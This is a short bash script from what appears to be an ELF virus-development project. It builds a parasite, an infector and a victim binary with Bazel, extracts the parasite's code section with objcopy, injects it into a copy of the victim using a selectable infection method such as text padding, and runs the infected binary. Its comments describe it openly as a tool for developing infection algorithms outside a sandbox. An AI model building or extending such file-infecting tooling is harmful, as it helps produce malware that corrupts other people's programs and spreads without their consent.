#/bin/bash
# this is a script that runs a series of commands to build and infect victim with different
# infection methods. This script is not sandboxed and is meant to provide convenience during
# infection algorithm development. Run with care.

# run with infector/infect_victim.sh [build-config] [method] [victim]
# for example: infector/infect_victim.sh gcc_aarch64 text_padding bazel-bin/infector/victim

set -e

# build test_parasite, infector and victim
bazel build //infector:test_parasite //infector:infector //infector:victim --config=$1

# extract virus's text segment
chmod 700 bazel-bin/infector/test_parasite \
      && objcopy --dump-section .text=/tmp/parasite_code bazel-bin/infector/test_parasite
echo "extracted virus to tmp/parasite_code"

# copy victim to tmp to be infected
cp $3 /tmp/victim \
      && chmod 700 /tmp/victim
echo "prepared victim to be infected at /tmp/victim"

echo "running infection algorithm $2"
bazel-bin/infector/infector /tmp/victim /tmp/parasite_code $2

# run the infected binary
echo "running the victim"
/tmp/victim
